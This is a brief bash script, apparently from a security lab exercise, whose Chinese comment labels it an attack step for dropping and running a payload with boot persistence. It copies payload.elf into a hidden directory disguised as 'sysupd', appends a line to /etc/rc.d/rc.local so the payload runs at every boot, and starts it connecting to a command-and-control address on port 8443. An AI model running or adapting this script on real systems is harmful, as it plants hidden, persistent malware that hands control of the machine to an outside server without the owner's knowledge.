#!/usr/bin/env bash
# attack（窗口内）：投放执行 + rc.local 开机持久化追加。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp payload.elf /tmp/.cache/sysupd/payload.elf && chmod 0755 /tmp/.cache/sysupd/payload.elf
RC=/etc/rc.d/rc.local; [ -f "$RC" ] || { echo '#!/bin/bash' > "$RC"; }
grep -q sysupd "$RC" || echo "/tmp/.cache/sysupd/payload.elf $C2_IP 8443" >> "$RC"
chmod +x "$RC"
/tmp/.cache/sysupd/payload.elf "$C2_IP" 8443
